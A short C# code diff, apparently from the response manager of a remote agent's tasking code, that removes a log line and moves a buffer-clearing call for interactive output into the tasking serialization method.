@@ -46,7 +46,6 @@ namespace Agent.Managers
         }
         public async Task AddResponse(ResponseResult res)
         {
-            logger.Log("Adding Response.");
             if (!responseResults.ContainsKey(res.task_id))
             {
                 responseResults.TryAdd(res.task_id, res);
@@ -144,7 +143,6 @@ namespace Agent.Managers
             responseResults.Clear();
             processResults.Clear();
             responseStrings.Clear();
-            interactiveOut.Clear();
 
           return results;
         }
@@ -243,6 +241,8 @@ namespace Agent.Managers
             this.socksOut.Clear();
             this.rpfwdOut.Clear();
             this.delegateMessages.Clear();
+            this.interactiveOut.Clear();
+
             return JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking);
         }
         public bool HasResponses()
